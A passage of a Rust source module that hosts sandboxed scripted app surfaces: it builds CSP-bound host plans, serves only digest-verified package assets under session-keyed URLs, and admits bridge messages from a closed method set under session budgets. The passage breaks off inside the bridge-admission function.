//! Scripted custom-surface host kernel (plan 1.6, phase P1/P2).
//!
//! This module owns the presentation side of the ratified
//! `custom_surfaces_v1` capability: compiling the host plan a client
//! loads (sandboxed frame, kernel-emitted CSP, digest-keyed entry
//! document addressed inside its live session path — the credential a
//! served frame can present, since its opaque origin carries no
//! headers), serving only digest-verified `surfaces/` bytes from the
//! exact live package revision (entry documents under their own digest
//! segment; their relative subresources — the sibling script/css a
//! multi-file surface needs — under the session's entry-document digest,
//! always with the served member's own manifest-verified bytes),
//! admitting bridge messages whose method
//! set is EXACTLY the eight supported-public operations, and mirroring
//! the surface-worker budgets: the session TTL is re-checked on EVERY
//! serving, scope and admission path (expired entries are evicted on
//! touch and swept at host-open, so expiry can neither serve nor wedge
//! the per-installation session limit), the message/payload watchdogs
//! trip at bridge admission, and the reload/crash budget is recorded by
//! the hosts through the API's reload-note route, with teardown
//! semantics. The frame holds no
//! credentials; the bridge is the only authority channel; the package
//! bytes are the only code source. Everything else is denied.
//!
//! The session also carries the REQUESTING SCOPE its host-open was
//! minted under (principal + workspace, the host route's own
//! authenticated scope): the asset route's session-bound fallback for
//! hosted web behind Cloudflare Access, where an interactive identity
//! has no workspace binding and a served frame's opaque origin can
//! carry no `X-Workspace` header — the session, not the request, names
//! the workspace for a credential-less frame GET.
//!
//! The no-script Phase 7 path (`surface_host.rs`, `surface_runtime.rs`)
//! is unchanged; this module never shares a session with it.

use std::{
    collections::HashMap,
    sync::{Arc, Mutex},
};

use chrono::{DateTime, Duration, Utc};
use magician_app_contract::{
    AppContractCapabilities, AppContractCapabilityLimits, AppManifestPermission,
    AppPublicOperationId, APP_SUPPORTED_PUBLIC_CONTRACT_VERSION,
};
use serde::{Deserialize, Serialize};
use serde_json::Value;
use thiserror::Error;

use super::{
    custom_surface_review::{custom_surface_v1_csp, CUSTOM_SURFACE_V1_SANDBOX},
    entity_changes::MAX_APP_ENTITY_CHANGE_LIMIT,
    manifest::AppPackageCandidate,
    models::{
        validate_json_value, AppContractError, AppContractLimits, AppDigest, AppInstallationId,
        AppReference, AppRevision, ValidateAppContract,
    },
    records::AppGrantedCustomSurfaceEntryPoint,
    registry_lifecycle::AppLifecycleEventKind,
    sandbox::{
        admit_bridge_message, mint_bridge_session, AppBridgeMessage, AppBridgeMethod,
        AppBridgeSession, AppCustomSurfaceMode, AppCustomSurfaceTeardown, AppSandboxError,
    },
    surface_assets::{
        resolve_surface_asset_from_candidate, surface_path_is_script_capable_document,
        AppResolvedSurfaceAsset, AppSurfaceAssetAdmission, AppSurfaceAssetError,
        AppSurfaceAssetKind,
    },
    surface_runtime::teardown_reason_for_lifecycle,
};

/// Schema version of the V1 scripted-surface bridge envelope.
pub const SCRIPTED_SURFACE_BRIDGE_SCHEMA_VERSION: u8 = 1;

/// URL prefix for digest-keyed, installation-scoped scripted-surface
/// asset serving, relative to the apps API root.
pub const SCRIPTED_SURFACE_ASSET_ROUTE_PREFIX: &str = "custom-surface-v1/assets";

/// Cache policy for digest-verified asset addressing: the address names
/// the exact content, so the response may be cached immutably.
pub const SCRIPTED_SURFACE_IMMUTABLE_CACHE_CONTROL: &str = "private, immutable, max-age=31536000";

/// Cache policy outside digest addressing: nothing may be stored.
pub const SCRIPTED_SURFACE_NO_STORE_CACHE_CONTROL: &str = "private, no-store";

/// Closed notice the host replaces a failed surface with — the worker's
/// existing error phrasing: no diagnostics, no payloads.
pub const SCRIPTED_SURFACE_FAILED_NOTICE: &str = "The custom surface failed safely and was closed.";

/// Closed notice for clients that cannot instantiate the host contract.
/// Never a degraded fallback that silently widens anything.
pub const SCRIPTED_SURFACE_UNSUPPORTED_NOTICE: &str =
    "Custom surfaces are not supported on this client.";

/// The closed, versioned bridge method set: exactly the eight
/// supported-public operations projected onto bridge methods, and nothing
/// else. `contract_capabilities` is answered host-side from the pinned
/// inventory digest — no backend round trip, no probing surface. The
/// worker bridge's `Subscribe`/`WaitActionRun` are expressed, not added:
/// subscription is cursor-bound `read_entity_changes` polling under the
/// shipped poll caps, and waiting is bounded `get_action_run` polling.
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, Hash)]
#[serde(rename_all = "snake_case")]
pub enum AppSurfaceV1Method {
    QueryData,
    MutateData,
    LaunchAction,
    GetActionRun,
    ComposeActionRun,
    CancelActionRun,
    ReadEntityChanges,
    ContractCapabilities,
}

impl AppSurfaceV1Method {
    pub const ALL: [Self; 8] = [
        Self::QueryData,
        Self::MutateData,
        Self::LaunchAction,
        Self::GetActionRun,
        Self::ComposeActionRun,
        Self::CancelActionRun,
        Self::ReadEntityChanges,
        Self::ContractCapabilities,
    ];

    pub const fn as_str(self) -> &'static str {
        match self {
            Self::QueryData => "query_data",
            Self::MutateData => "mutate_data",
            Self::LaunchAction => "launch_action",
            Self::GetActionRun => "get_action_run",
            Self::ComposeActionRun => "compose_action_run",
            Self::CancelActionRun => "cancel_action_run",
            Self::ReadEntityChanges => "read_entity_changes",
            Self::ContractCapabilities => "contract_capabilities",
        }
    }

    /// The supported-public operation this method projects onto. The
    /// bridge is an exact projection: a method with no operation id here
    /// cannot exist on the wire.
    pub const fn operation_id(self) -> AppPublicOperationId {
        match self {
            Self::QueryData => AppPublicOperationId::QueryData,
            Self::MutateData => AppPublicOperationId::MutateData,
            Self::LaunchAction => AppPublicOperationId::LaunchAction,
            Self::GetActionRun => AppPublicOperationId::GetActionRun,
            Self::ComposeActionRun => AppPublicOperationId::ComposeActionRun,
            Self::CancelActionRun => AppPublicOperationId::CancelActionRun,
            Self::ReadEntityChanges => AppPublicOperationId::ReadEntityChanges,
            Self::ContractCapabilities => AppPublicOperationId::ContractCapabilities,
        }
    }

    /// The existing worker-bridge method whose admission arm this method
    /// reuses. The sandbox kernel ignores the method during admission;
    /// this projection exists so replay, sequence, origin, revision and
    /// payload checks are the SAME kernel code, not a copy.
    const fn admission_method(self) -> AppBridgeMethod {
        match self {
            Self::QueryData | Self::ContractCapabilities => AppBridgeMethod::Query,
            Self::MutateData => AppBridgeMethod::Mutate,
            Self::LaunchAction | Self::ComposeActionRun => AppBridgeMethod::InvokeAction,
            Self::GetActionRun => AppBridgeMethod::GetActionRun,
            Self::CancelActionRun => AppBridgeMethod::CancelActionRun,
            Self::ReadEntityChanges => AppBridgeMethod::Subscribe,
        }
    }
}

/// Bridge envelope with the existing `AppBridgeMessage` fields, unchanged,
/// over the closed V1 method set. Unknown methods, unknown schema
/// versions, and unknown fields are refused (`deny_unknown_fields` plus
/// the closed enum).
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(deny_unknown_fields)]
pub struct AppSurfaceV1BridgeMessage {
    pub schema_version: u8,
    pub request_id: AppReference,
    pub sequence: u64,
    pub method: AppSurfaceV1Method,
    pub origin: String,
    pub session_ref: AppReference,
    pub nonce: AppReference,
    pub installation_id: AppInstallationId,
    pub package_revision_ref: AppReference,
    pub surface_revision: AppRevision,
    pub grant_revision: AppRevision,
    #[serde(default)]
    pub view_or_action: Option<super::models::AppName>,
    #[serde(default)]
    pub payload: Value,
}

impl AppSurfaceV1BridgeMessage {
    /// Project onto the existing kernel message for admission. Every
    /// binding field is copied verbatim; only the method maps, because
    /// the shared kernel does not consult it.
    fn admission_projection(&self) -> AppBridgeMessage {
        AppBridgeMessage {
            schema_version: self.schema_version,
            request_id: self.request_id.clone(),
            sequence: self.sequence,
            method: self.method.admission_method(),
            origin: self.origin.clone(),
            session_ref: self.session_ref.clone(),
            nonce: self.nonce.clone(),
            installation_id: self.installation_id.clone(),
            package_revision_ref: self.package_revision_ref.clone(),
            surface_revision: self.surface_revision,
            grant_revision: self.grant_revision,
            view_or_action: self.view_or_action.clone(),
            payload: self.payload.clone(),
        }
    }
}

impl ValidateAppContract for AppSurfaceV1BridgeMessage {
    fn validate_app_contract(&self, limits: &AppContractLimits) -> Result<(), AppContractError> {
        if self.schema_version != SCRIPTED_SURFACE_BRIDGE_SCHEMA_VERSION {
            return Err(AppContractError::invalid(
                "schema_version",
                "must be the admitted scripted-surface bridge version",
            ));
        }
        if self.origin.is_empty() || self.origin.len() > 255 {
            return Err(AppContractError::invalid(
                "origin",
                "must contain between 1 and 255 bytes",
            ));
        }
        validate_json_value(&self.payload, limits)?;
        Ok(())
    }
}

#[derive(Debug, Error, Clone, PartialEq, Eq)]
pub enum AppScriptedSurfaceHostError {
    #[error(transparent)]
    Sandbox(#[from] AppSandboxError),
    #[error(transparent)]
    Asset(#[from] AppSurfaceAssetError),
    #[error("the custom_surfaces_v1 capability is disabled for this process")]
    CapabilityDisabled,
    #[error("the package does not declare the custom_surface permission")]
    PermissionAbsent,
    #[error("the requested entry point was not declared by this package")]
    EntryPointNotDeclared,
    /// The declared entry point is outside the owner's grant (plan 1.6
    /// completion): the per-installation surface grant is never
    /// implicit-all, so a route that was declared but not granted — or
    /// granted with a different document — hosts nothing.
    #[error("the entry point was granted no custom-surface hosting by the owner")]
    EntryPointNotGranted,
    /// The entry document's live bytes no longer hash to the digest the
    /// owner attested at approval. The grant is stale against the live
    /// package; hosting fails closed until a fresh review re-grants it.
    #[error(
        "the entry document no longer matches the digest granted at approval; refresh the \
         installation review"
    )]
    GrantedDigestStale,
    #[error("scripted-surface session is unknown or torn down")]
    SessionGone,
    #[error("scripted-surface session reference is already in use")]
    SessionCollision,
    #[error("scripted-surface watchdog refused the request")]
    WatchdogTripped,
    #[error("scripted-surface session limit for this installation was reached")]
    SessionLimit,
    #[error(
        "scripted-surface asset address names neither the member's content digest nor the \
         session's entry document"
    )]
    DigestMismatch,
    #[error("scripted-surface reload or crash budget was exceeded")]
    ReloadBudgetExceeded,
    #[error("the kernel CSP could not be composed for the surface origin")]
    CspCompositionFailed,
}

/// Host plan a client loads for one declared entry point: the frame
/// attributes (kernel constants), the digest-keyed entry document
/// address, and the minted bridge session binding. The entry URL
/// carries the session reference as a path segment — the asset route's
/// required credential, embedded at mint time because a
/// served frame (opaque origin, `allow-scripts` only) can present no
/// headers. Keeping it in the path is required for relative script/style
/// members: URL resolution does not inherit a base URL's query string.
#[derive(Debug, Clone, Serialize, PartialEq)]
pub struct AppScriptedSurfaceHostPlan {
    pub installation_id: AppInstallationId,
    pub session_ref: AppReference,
    pub nonce: AppReference,
    pub host_session_ref: AppReference,
    pub package_revision_ref: AppReference,
    pub surface_revision: AppRevision,
    pub grant_revision: AppRevision,
    pub sandbox: &'static str,
    pub csp: String,
    pub entry_route: String,
    pub entry_document: String,
    pub entry_document_digest: AppDigest,
    /// Session- and digest-keyed entry address; loadable as-is by the host
    /// frame, with relative sibling assets retaining the session segment.
    pub entry_url: String,
    pub expires_at: DateTime<Utc>,
    /// Admitted bridge methods, in supported-public inventory order.
    pub methods: Vec<&'static str>,
    pub plan_digest: AppDigest,
}

/// Compile the host plan for one declared entry point. Fail-closed
/// preconditions: the operator switch is on, the package declares the
/// permission and the entry point, the entry point is inside the
/// installation's live owner grant — an exact `(route, document)` pair
/// whose attested document digest the live member must still hash to —
/// the installation is `Enabled` with an `Active` surface at the exact
/// live revision, and the entry document resolves as a non-executable
/// `surfaces/` HTML member of that revision. The operator switch stays
/// the process-wide control; the grant is the per-installation control,
/// and an empty grant hosts nothing.
pub fn compile_scripted_surface_host_plan(
    candidate: &AppPackageCandidate,
    entry_route: &str,
    granted_entry_points: &[AppGrantedCustomSurfaceEntryPoint],
    admission: AppSurfaceAssetAdmission<'_>,
    frame_ancestors_origin: &str,
    operator_enabled: bool,
    _now: DateTime<Utc>,
) -> Result<AppScriptedSurfaceHostPlan, AppScriptedSurfaceHostError> {
    if !operator_enabled {
        return Err(AppScriptedSurfaceHostError::CapabilityDisabled);
    }
    let manifest = candidate.manifest().manifest();
    let declaration = manifest
        .app
        .custom_surface
        .as_ref()
        .filter(|_| {
            manifest
                .app
                .permissions
                .contains(&AppManifestPermission::CustomSurface)
        })
        .ok_or(AppScriptedSurfaceHostError::PermissionAbsent)?;
    let entry = declaration
        .entry_points
        .iter()
        .find(|entry| entry.route.as_str() == entry_route)
        .ok_or(AppScriptedSurfaceHostError::EntryPointNotDeclared)?;
    // Per-installation grant enforcement (plan 1.6 completion): only an
    // exactly granted `(route, document)` pair may host. Document mismatch
    // is a substitution, not a grant; an absent or empty grant admits
    // nothing — never implicit-all.
    let granted = granted_entry_points
        .iter()
        .find(|granted| granted.route == entry_route && granted.document == entry.document.as_str())
        .ok_or(AppScriptedSurfaceHostError::EntryPointNotGranted)?;
    let resolved = resolve_surface_asset_from_candidate(
        candidate.members(),
        entry.document.as_str(),
        clone_admission(&admission),
        AppCustomSurfaceMode::ScriptedRequiresKillableBoundary,
        true,
    )?;
    if resolved.kind != AppSurfaceAssetKind::Document {
        return Err(AppSurfaceAssetError::NotASurfacePath.into());
    }
    // The granted digest is the runtime fence: the live entry document
    // must still hash to the bytes the owner reviewed. A swapped document
    // (or a grant carried across a package change) refuses here, fail
    // closed, until a fresh review re-grants the surface.
    if resolved.content_digest != granted.document_digest {
        return Err(AppScriptedSurfaceHostError::GrantedDigestStale);
    }
    let session = resolved.session.clone();
    let entry_url = scripted_surface_asset_address(
        &session.installation_id,
        &session.session_ref,
        &resolved.content_digest,
        resolved.path.as_str(),
    );
    let csp = custom_surface_v1_csp(frame_ancestors_origin)
        .map_err(|_| AppScriptedSurfaceHostError::CspCompositionFailed)?;
    let methods = AppSurfaceV1Method::ALL
        .iter()
        .map(|method| method.as_str())
        .collect::<Vec<_>>();
    let plan_digest = AppDigest::blake3(
        format!(
            "{}|{}|{}|{}|{}|{}|{}|{}",
            SCRIPTED_SURFACE_BRIDGE_SCHEMA_VERSION,
            session.session_ref.as_str(),
            session.installation_id.as_str(),
            session.package_revision_ref.as_str(),
            entry_route,
            resolved.path.as_str(),
            resolved.content_digest.as_str(),
            &csp,
        )
        .as_bytes(),
    );
    Ok(AppScriptedSurfaceHostPlan {
        installation_id: session.installation_id.clone(),
        session_ref: session.session_ref.clone(),
        nonce: session.nonce.clone(),
        host_session_ref: session.host_session_ref.clone(),
        package_revision_ref: session.package_revision_ref.clone(),
        surface_revision: session.surface_revision,
        grant_revision: session.grant_revision,
        sandbox: CUSTOM_SURFACE_V1_SANDBOX,
        csp,
        entry_route: entry_route.to_owned(),
        entry_document: resolved.path.as_str().to_owned(),
        entry_document_digest: resolved.content_digest.clone(),
        entry_url,
        expires_at: session.expires_at,
        methods,
        plan_digest,
    })
}

fn clone_admission<'a>(admission: &AppSurfaceAssetAdmission<'a>) -> AppSurfaceAssetAdmission<'a> {
    AppSurfaceAssetAdmission {
        package_revision_ref: admission.package_revision_ref,
        live_package_revision_ref: admission.live_package_revision_ref,
        bundle_digest: admission.bundle_digest,
        live_bundle_digest: admission.live_bundle_digest,
        installation_id: admission.installation_id.clone(),
        installation_status: admission.installation_status,
        surface_status: admission.surface_status,
        surface_revision: admission.surface_revision,
        grant_revision: admission.grant_revision,
        host_session_ref: admission.host_session_ref.clone(),
        session_ref: admission.session_ref.clone(),
        nonce: admission.nonce.clone(),
        now: admission.now,
    }
}

/// Digest-keyed, installation-scoped asset address carrying the live
/// session reference the serving route requires. Only bytes whose
/// blake3 digest matches the address segment may be served under it,
/// and only while `session_ref` names a live scripted session: the
/// session path segment is the one credential a served frame can actually
/// present (a sandboxed frame's origin is opaque, so it can carry no headers).
/// Relative subresources inherit path segments, unlike query parameters, so
/// a multi-file surface retains the same live session when it resolves a
/// sibling script or style member.
pub fn scripted_surface_asset_address(
    installation_id: &AppInstallationId,
    session_ref: &AppReference,
    content_digest: &AppDigest,
    path: &str,
) -> String {
    format!(
        "/api/magician/v2/apps/installations/{}/{}/{}/{}",
        installation_id.as_str(),
        SCRIPTED_SURFACE_ASSET_ROUTE_PREFIX,
        session_ref.as_str(),
        &format!("{}/{}", content_digest.as_str(), path),
    )
}

/// Parse the session-bearing asset tail minted by
/// [`scripted_surface_asset_address`]: `<session>/<digest>/<surfaces/path>`.
pub fn parse_scripted_surface_session_asset_address(
    tail: &str,
) -> Result<(AppReference, String, String), AppScriptedSurfaceHostError> {
    let (session, asset_tail) = tail
        .split_once('/')
        .ok_or(AppScriptedSurfaceHostError::SessionGone)?;
    if session.is_empty()
        || session
            .chars()
            .any(|character| matches!(character, '/' | '\\'))
    {
        return Err(AppScriptedSurfaceHostError::SessionGone);
    }
    let session = AppReference::parse(session.to_owned())
        .map_err(|_| AppScriptedSurfaceHostError::SessionGone)?;
    let (digest, path) = parse_scripted_surface_asset_address(asset_tail)?;
    Ok((session, digest, path))
}

/// Parse the asset tail of a serving request: `<digest>/<surfaces/path>`.
/// The digest must be the canonical `blake3:<64 lowercase hex>` form and
/// the path a canonical `surfaces/` member.
pub fn parse_scripted_surface_asset_address(
    tail: &str,
) -> Result<(String, String), AppScriptedSurfaceHostError> {
    let (digest, path) = tail
        .split_once('/')
        .ok_or(AppScriptedSurfaceHostError::DigestMismatch)?;
    let hex = digest
        .strip_prefix("blake3:")
        .ok_or(AppScriptedSurfaceHostError::DigestMismatch)?;
    if hex.len() != 64 || !hex.bytes().all(|byte| byte.is_ascii_hexdigit()) {
        return Err(AppScriptedSurfaceHostError::DigestMismatch);
    }
    if !path.starts_with("surfaces/") || path.contains("..") || path.contains('\\') {
        return Err(AppSurfaceAssetError::NotASurfacePath.into());
    }
    Ok((digest.to_owned(), path.to_owned()))
}

/// Cache-control for one asset response: immutable only when the served
/// bytes verified against the digest in the address; `no-store`
/// everywhere else (design T8).
pub fn asset_cache_control(digest_verified: bool) -> &'static str {
    if digest_verified {
        SCRIPTED_SURFACE_IMMUTABLE_CACHE_CONTROL
    } else {
        SCRIPTED_SURFACE_NO_STORE_CACHE_CONTROL
    }
}

/// Host-side answer for `contract_capabilities`: built from the pinned
/// static inventory digest, never a backend round trip.
pub fn v1_contract_capabilities_reply(limits: &AppContractLimits) -> Value {
    let capabilities = AppContractCapabilities::current(AppContractCapabilityLimits {
        max_document_bytes: limits.max_document_bytes() as u64,
        max_json_depth: limits.max_json_depth() as u64,
        max_json_nodes: limits.max_json_nodes() as u64,
        max_value_bytes: limits.max_value_bytes() as u64,
        max_value_nodes: limits.max_value_nodes() as u64,
        max_collection_items: limits.max_collection_items() as u64,
        max_predicate_nodes: limits.max_predicate_nodes() as u64,
        max_predicate_depth: limits.max_predicate_depth() as u64,
        max_page_rows: limits.max_page_rows() as u64,
        max_entity_change_page_rows: MAX_APP_ENTITY_CHANGE_LIMIT as u64,
    });
    serde_json::to_value(&capabilities).unwrap_or_else(|_| {
        serde_json::json!({
            "contract_version": APP_SUPPORTED_PUBLIC_CONTRACT_VERSION
        })
    })
}

/// Budgets mirroring the surface-worker defaults: 15-minute session TTL,
/// 32 messages and 256 KiB cumulative payload per session, at most 8
/// concurrent sessions per installation, and a reload/crash budget of 3
/// before quarantine teardown.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct AppScriptedSurfaceWatchdog {
    pub max_messages: u32,
    pub max_payload_bytes: u64,
    pub max_sessions_per_installation: usize,
    pub max_reloads: u32,
    pub session_ttl: Duration,
}

impl Default for AppScriptedSurfaceWatchdog {
    fn default() -> Self {
        Self {
            max_messages: 32,
            max_payload_bytes: 256 * 1024,
            max_sessions_per_installation: 8,
            max_reloads: 3,
            session_ttl: Duration::minutes(15),
        }
    }
}

/// The requesting scope one scripted-surface session is bound to at
/// mint: the principal and workspace the host route's own authenticated
/// request resolved when it opened the host (the hosted-web CF Access
/// decision). Held as plain server-side strings — never serialized into
/// the host plan, never readable from the frame — so the asset route can
/// re-derive the serving scope for a credential-less frame request that
/// carries only the minted session path segment. The session, not the
/// request, names the workspace; the principal is still re-checked
/// against the verified identity at every use.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AppScriptedSurfaceRequestScope {
    pub principal: String,
    pub workspace: String,
}

/// Server-owned proof for one read-only asset request. Only the live session
/// registry can construct it; it is never a general API identity or serialized.
#[derive(Debug, Clone)]
pub struct AppScriptedSurfaceAssetCredential {
    scope: AppScriptedSurfaceRequestScope,
    host_session_ref: AppReference,
    expires_at: DateTime<Utc>,
}

impl AppScriptedSurfaceAssetCredential {
    pub fn scope(&self) -> &AppScriptedSurfaceRequestScope {
        &self.scope
    }

    pub fn host_session_ref(&self) -> &AppReference {
        &self.host_session_ref
    }

    pub fn expires_at(&self) -> DateTime<Utc> {
        self.expires_at
    }
}

struct ScriptedLiveSession {
    plan: AppScriptedSurfaceHostPlan,
    session: AppBridgeSession,
    requesting_scope: AppScriptedSurfaceRequestScope,
    message_count: u32,
    payload_bytes: u64,
    opened_at: DateTime<Utc>,
    reload_count: u32,
}

/// Live scripted-surface session registry with the same discipline as
/// `AppCustomSurfaceRuntime`: sessions are keyed by the bridge reference
/// minted at host-open; every message re-derives its installation from
/// that session, never from the wire. The registry holds ONLY live
/// sessions: teardown and every budget trip evict immediately, TTL
/// expiry evicts lazily on the next touch (`admit_bridge`,
/// `serve_asset`, `session_scope`, `note_reload`, `session_live`), and
/// `open_host` sweeps an installation's expired entries before counting
/// its session budget — so a dead session reference is indistinguishable
/// from an unknown one and the map cannot grow without bound.
pub struct AppScriptedSurfaceRuntime {
    watchdog: AppScriptedSurfaceWatchdog,
    sessions: Arc<Mutex<HashMap<AppReference, ScriptedLiveSession>>>,
}

impl Default for AppScriptedSurfaceRuntime {
    fn default() -> Self {
        Self::new(AppScriptedSurfaceWatchdog::default())
    }
}

impl AppScriptedSurfaceRuntime {
    /// Authenticate only the canonical, session-bearing asset GET path.
    /// Method and query checks belong to the HTTP caller. Installation binding
    /// is checked before lending scope, and dead sessions lend no authority.
    pub fn asset_credential(
        &self,
        path: &str,
        now: DateTime<Utc>,
    ) -> Option<AppScriptedSurfaceAssetCredential> {
        if path.contains('%') || path.contains('?') || path.contains('#') {
            return None;
        }
        let tail = path.strip_prefix("/api/magician/v2/apps/installations/")?;
        let (installation_id, tail) = tail.split_once("/custom-surface-v1/assets/")?;
        let installation_id = AppInstallationId::parse(installation_id.to_owned()).ok()?;
        let (session_ref, _, _) = parse_scripted_surface_session_asset_address(tail).ok()?;
        let mut sessions = self
            .sessions
            .lock()
            .unwrap_or_else(|error| error.into_inner());
        let live = sessions.get(&session_ref)?;
        if !self.session_is_live(live, now) {
            sessions.remove(&session_ref);
            return None;
        }
        if live.plan.installation_id != installation_id {
            return None;
        }
        Some(AppScriptedSurfaceAssetCredential {
            scope: live.requesting_scope.clone(),
            host_session_ref: live.plan.host_session_ref.clone(),
            expires_at: live.plan.expires_at,
        })
    }

    pub fn new(watchdog: AppScriptedSurfaceWatchdog) -> Self {
        Self {
            watchdog,
            sessions: Arc::new(Mutex::new(HashMap::new())),
        }
    }

    /// Register a compiled host plan as a live session, bound to the
    /// requesting scope the host route authenticated (`session_scope`
    /// lends it back while the session lives). Refuses to exceed the
    /// per-installation session limit — counted over LIVE sessions only:
    /// the installation's TTL-expired entries are swept here, before the
    /// count, so a host-open after TTL silence never wedges behind
    /// sessions that no longer serve. The plan's sandbox must remain
    /// the kernel constant (never the general iframe tokens). A session
    /// reference that is already live is REFUSED, never silently
    /// overwritten — the minted reference names one session for its whole
    /// lifetime.
    pub fn open_host(
        &self,
        plan: AppScriptedSurfaceHostPlan,
        requesting_scope: AppScriptedSurfaceRequestScope,
        now: DateTime<Utc>,
    ) -> Result<AppScriptedSurfaceHostPlan, AppScriptedSurfaceHostError> {
        if plan.sandbox != CUSTOM_SURFACE_V1_SANDBOX
            || plan
                .sandbox
                .split_whitespace()
                .any(|token| token == "allow-same-origin")
        {
            return Err(AppSandboxError::GeneralIframeTokensRefused.into());
        }
        let mut sessions = self
            .sessions
            .lock()
            .unwrap_or_else(|error| error.into_inner());
        if sessions.contains_key(&plan.session_ref) {
            return Err(AppScriptedSurfaceHostError::SessionCollision);
        }
        // Sweep this installation's expired entries before counting
        // (bounded O(n) over the map): the per-installation limit is a
        // budget on LIVE sessions, never a graveyard of expired ones.
        sessions.retain(|_, live| {
            live.plan.installation_id != plan.installation_id || self.session_is_live(live, now)
        });
        let open_for_install = sessions
            .values()
            .filter(|live| live.plan.installation_id == plan.installation_id)
            .count();
        if open_for_install >= self.watchdog.max_sessions_per_installation {
            return Err(AppScriptedSurfaceHostError::SessionLimit);
        }
        let session = mint_bridge_session(
            plan.session_ref.clone(),
            plan.installation_id.clone(),
            plan.package_revision_ref.clone(),
            plan.surface_revision,
            plan.grant_revision,
            plan.host_session_ref.clone(),
            plan.nonce.clone(),
            plan.expires_at - self.watchdog.session_ttl,
        );
        sessions.insert(
            plan.session_ref.clone(),
            ScriptedLiveSession {
                plan: plan.clone(),
                session,
                requesting_scope,
                message_count: 0,
                payload_bytes: 0,
                opened_at: plan.expires_at - self.watchdog.session_ttl,
                reload_count: 0,
            },
        );
        Ok(plan)
    }

    /// Serve one digest-addressed asset for a live session. The resolved
    /// bytes must hash to the digest named in the address — or, since the
    /// 1.6 kernel fix for multi-file surfaces, the address's digest
    /// segment may instead name the SESSION'S ENTRY DOCUMENT: a relative
    /// subresource of the entry document (`<script src="canvas.js">`)
    /// resolves under the entry's digest segment, and a sandboxed frame
    /// cannot construct any other address (the installation prefix, the
    /// minted session and the sibling's own blake3 digest are unknowable
    /// to authored HTML, and the CSP forbids inline script and any
    /// fetch). Such a sibling is resolved against the same live package
    /// bundle and served with its OWN manifest-verified bytes: the member
    /// must be in the verified bundle, script-capable documents stay
    /// declared-entry-document-only, and executable wasm stays refused.
    /// The sibling route stays ANCHORED: the live entry-document member
    /// must still hash to the address's digest, so an entry document that
    /// drifted since the session was minted refuses its siblings exactly
    /// as it refuses itself. Anything else fails closed — a digest
    /// segment naming NEITHER the requested member NOR the session's
    /// still-live entry document is a `DigestMismatch`, and only a live
    /// session gates the route at all: the TTL is re-checked at serving
    /// time, and an expired session is evicted and answers `SessionGone`
    /// exactly like an unknown reference.
    pub fn serve_asset(
        &self,
        candidate: &AppPackageCandidate,
        session_ref: &AppReference,
        digest_address: &str,
        path: &str,
        admission: AppSurfaceAssetAdmission<'_>,
        now: DateTime<Utc>,
    ) -> Result<(AppResolvedSurfaceAsset, &'static str), AppScriptedSurfaceHostError> {
        let (entry_document_path, entry_document_digest) = {
            let mut sessions = self
                .sessions
                .lock()
                .unwrap_or_else(|error| error.into_inner());
            // Liveness answers from the registry in place: the entry leaves
            // the map ONLY on the TTL branch — the exact removal path every
            // watchdog trip uses. The live path copies just the two
            // entry-document fields the post-guard digest anchor needs, so
            // serving an asset no longer moves the whole
            // `ScriptedLiveSession` (full host plan included) out of the
            // map and back on every request.
            let Some(live) = sessions.get(session_ref) else {
                return Err(AppScriptedSurfaceHostError::SessionGone);
            };
            if !self.session_is_live(live, now) {
                sessions.remove(session_ref);
                return Err(AppScriptedSurfaceHostError::SessionGone);
            }
            if live.plan.installation_id != admission.installation_id
                || live.plan.session_ref != admission.session_ref
                || live.plan.host_session_ref != admission.host_session_ref
            {
                return Err(AppSandboxError::SessionMismatch.into());
            }
            if &live.plan.package_revision_ref != admission.live_package_revision_ref
                || live.plan.surface_revision != admission.surface_revision
                || live.plan.grant_revision != admission.grant_revision
            {
                return Err(AppSandboxError::StaleRevision.into());
            }
            (
                live.plan.entry_document.clone(),
                live.plan.entry_document_digest.clone(),
            )
        };
        let declared_entry_documents: Vec<&str> = candidate
            .manifest()
            .manifest()
            .app
            .custom_surface
            .as_ref()
            .map(|declaration| {
                declaration
                    .entry_points
                    .iter()
                    .map(|entry| entry.document.as_str())
                    .collect()
            })
            .unwrap_or_default();
        if surface_path_is_script_capable_document(path)
            && !declared_entry_documents.contains(&path)
        {
            return Err(AppSurfaceAssetError::ScriptCapableDocumentRefused.into());
        }
        let asset = resolve_surface_asset_from_candidate(
            candidate.members(),
            path,
            admission,
            AppCustomSurfaceMode::ScriptedRequiresKillableBoundary,
            true,
        )?;
        // Digest-keyed admission, session-scoped for siblings. Direct
        // addressing (the address names the served member's own content)
        // answers immutable (design T8). A sibling is admitted only when
        // the address's digest names the session's entry document AND the
        // LIVE entry-document member still hashes to it — the anchor of
        // the sibling route is an entry document that is still valid at
        // its own address, so a drifted entry document refuses its
        // siblings exactly as it refuses itself. A sibling answers
        // `no-store`, because its address names the entry document, not
        // these bytes — a later revision that changes only the script
        // keeps the same sibling URL, and immutable storage could pin the
        // stale script. Anything else names nothing servable.
        let digest_verified = asset.content_digest.as_str() == digest_address;
        if !digest_verified {
            let sibling_of_live_entry = digest_address == entry_document_digest.as_str()
                && candidate
                    .members()
                    .iter()
                    .find(|member| member.path().as_str() == entry_document_path)
                    .is_some_and(|member| member.content_digest().as_str() == digest_address);
            if !sibling_of_live_entry {
                return Err(AppScriptedSurfaceHostError::DigestMismatch);
            }
        }
        Ok((asset, asset_cache_control(digest_verified)))
    }

    /// Admit one bridge message against the minted session. The
    /// installation, revisions, nonce and session reference come from the
    /// session, never the wire; the shared sandbox kernel performs the
    /// replay, sequence, origin, revision and payload checks. Watchdog
    /// trips (TTL, message flood, payload flood) EVICT the session — a
    /// refused-budget session is removed from the registry, not parked in
    /// it.
    pub fn admit_bridge(
        &self,
        message: &AppSurfaceV1BridgeMessage,
        now: DateTime<Utc>,
        live_package_revision_ref: &AppReference,
        live_surface_revision: AppRevision,
        live_grant_revision: AppRevision,
        limits: &AppContractLimits,
    ) -> Result<AppBridgeMessage, AppScriptedSurfaceHostError> {
        if message.schema_version != SCRIPTED_SURFACE_BRIDGE_SCHEMA_VERSION {
            return Err(AppSandboxError::UnknownMethod.into());
        }
        let projection = message.admission_projection();
        let mut sessions = self
            .sessions
            .lock()
            .unwrap_or_else(|error| error.into_inner());
        // Take the session OUT of the registry for admission: it goes back
        // in only if it stays live. Every watchdog trip below therefore
        // evicts by construction.
        let Some(mut live) = sessions.remove(&message.session_ref) else {
